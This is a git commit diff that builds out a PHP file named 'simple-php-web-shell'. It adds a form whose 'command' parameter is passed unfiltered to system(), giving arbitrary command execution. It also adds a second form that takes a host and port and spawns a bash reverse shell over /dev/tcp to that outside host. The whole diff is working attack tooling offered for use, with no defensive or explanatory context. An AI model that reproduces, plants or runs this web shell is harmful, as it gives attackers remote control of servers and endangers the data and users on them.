4b325c977f9a65210af341285a5063214ee38e01
lithDev <115331024+lithDevv@users.noreply.github.com>
2022-10-17 23:21:27 -0700

    Update shell.php

--- simple-php-web-shell/shell.php
+++ simple-php-web-shell/shell.php
@@ -1,7 +1,3 @@
-<?php 
-
-?>
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -10,7 +6,37 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>simple-web-shell</title>
 </head>
+<style>
+    body {
+        background-color: grey;
+    }
+</style>
 <body>
-    
+    <hr>
+    <form action="" method="GET">
+        <input type="text" name="command" placeholder="command" style="width: 1895px;">
+        <input type="submit" value="execute command" style="width: 100%;">
+    </form>
+<div>
+<?php 
+if(isset($_GET['command'])) {
+    system($_GET["command"]);
+}
+?>
+</div>
+<form action="" method="GET">
+    <hr>
+    <input type="text" name="HOST" placeholder="Enter Host" style="width: 1895px;">
+    <input type="text" name="PORT" placeholder="Enter Port" style="width: 1895px;">
+    <input type="submit" value="Reverse Shell the server" style="width: 100%;">
+    <hr>
+</form>
+<?php 
+if(isset($_GET['HOST'])) {
+    $port      = $_GET['PORT'];
+    $host      = $_GET['HOST'];
+    system("/bin/bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'");
+}
+?>
 </body>
 </html>
